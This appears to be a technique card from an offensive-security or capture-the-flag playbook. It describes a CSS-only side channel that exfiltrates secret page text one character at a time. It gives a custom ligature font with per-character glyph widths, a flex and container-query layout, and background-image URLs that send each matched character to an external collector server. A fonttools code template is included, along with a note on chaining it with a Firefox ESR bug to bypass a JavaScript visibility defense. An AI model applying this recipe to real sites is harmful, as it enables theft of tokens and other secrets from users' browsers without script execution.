---
name: css_font_ligature_width_side_channel
vuln_type: xss
sub_technique: css_side_channel
category: exploitation
safety_level: safe
tags:
- css
- font
- ligature
- side-channel
- exfiltration
- container-query
---

# Css Font Ligature Width Side-Channel — Character-By-Character Data Exfiltration

## When to Apply

Secret text exists in the DOM and the attacker can inject CSS to apply a custom font to that element. Text content can be exfiltrated one character at a time using CSS only, without JavaScript execution.

## Prerequisites

- Secret text exists in a DOM element (e.g. flag div)
- CSS injection possible (style tag or @import)
- Browser supports external font loading + container queries
- External collector server needed (serves fonts/CSS + collects hits)

## Steps

1. **Build custom font**: use fonttools to build a ligature font
   - Known prefix + each candidate character → mapped to glyphs with different widths
   - e.g.: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...
2. **CSS layout setup**: flex container + container query
   - `#page` = flex row, fixed width
   - `#flag` = flex: 0 0 auto (takes up text width)
   - `.spacer` = flex: 1 1 auto + container-type: size (remaining space)
3. **Container Query oracle**: different background-image URL based on spacer width
   - `@container (width: Npx) { .spacer::before { background-image: url(.../hit?c=X); } }`
4. **Exfiltrate one character**: browser loads only the matching URL → character sent to collector
5. **Repeat**: update prefix → generate new font/CSS → exfiltrate next character

## Code Template

```
# Font generation (fonttools)
fb = FontBuilder(1000, isTTF=True)
# generate ligature glyph with different width for each candidate character
for i, ch in enumerate(candidates):
    metrics[lig_name(i)] = (i + 1, 0)  # width = index+1
# OpenType feature: sub prefix_glyphs candidate_glyph by lig_glyph
fea = 'sub ' + ' '.join(glyph_name(c) for c in prefix) + ' ' + glyph_name(ch) + ' by ' + lig_name(i)

# CSS: @font-face + flex layout + container query
# @container (width: Npx) { background-image: url(collector/hit?c=X); }
```

## Examples

### Example 1

- **flag_element**: <div id="flag">{{ flag }}</div>
- **font_lib**: fonttools (Python)
- **exfil_method**: container query → background-image URL per character
- **chars_per_iteration**: 1
- **total_iterations**: flag_length - prefix_length
- **success_rate**: ~80% per attempt, 5 retries

Combined with the Firefox ESR content-visibility:hidden bug. Bypasses JS defense (checkVisibility) while executing font ligature side-channel. 5 consecutive characters exfiltrated successfully in local testing.
